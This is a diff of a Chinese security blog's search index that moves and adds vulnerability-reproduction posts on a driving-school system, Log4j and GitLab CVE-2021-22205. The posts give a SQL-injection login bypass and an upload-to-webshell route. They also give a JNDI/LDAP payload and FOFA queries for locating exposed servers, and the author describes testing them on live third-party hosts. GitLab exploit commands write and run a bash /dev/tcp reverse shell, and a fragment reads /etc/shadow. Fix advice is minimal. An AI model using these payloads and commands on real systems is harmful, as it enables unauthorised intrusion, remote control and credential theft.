@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>【1039家校通】SQL注入和后台GETSHELL</title>
+    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
+&#x2F;Student&#x2F;StudentLogin.aspx
+&#x2F;Teacher&#x2F;Index.aspx
+&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
+<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
+<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
+<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
+<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
+&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
+<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2014.7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
+    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
+<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
+<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
+<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
+<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
+<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.12</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【Apache】Apache Solr任意文件读取漏洞复现</title>
     <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -170,72 +236,6 @@ stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" c
       </tags>
   </entry>
   <entry>
-    <title>【1039家校通】SQL注入和后台GETSHELL</title>
-    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
-&#x2F;Student&#x2F;StudentLogin.aspx
-&#x2F;Teacher&#x2F;Index.aspx
-&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
-<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
-<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
-<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
-&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
-<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2014.7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
-    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
-<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
-<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
-<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
-<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
-<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
-<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.12</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【CVE-2020-17519/17518】Apache Flink任意文件上传/读取漏洞复现</title>
     <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
@@ -294,6 +294,280 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </categories>
       <tags>
         <tag>2021.1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
+    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
+app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<a id="more"></a>
+
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
+<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
+<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
+<pre class="line-numbers language-none"><code class="language-none">反弹shell：
+
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，对写入成功的sh脚本加执行权限
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
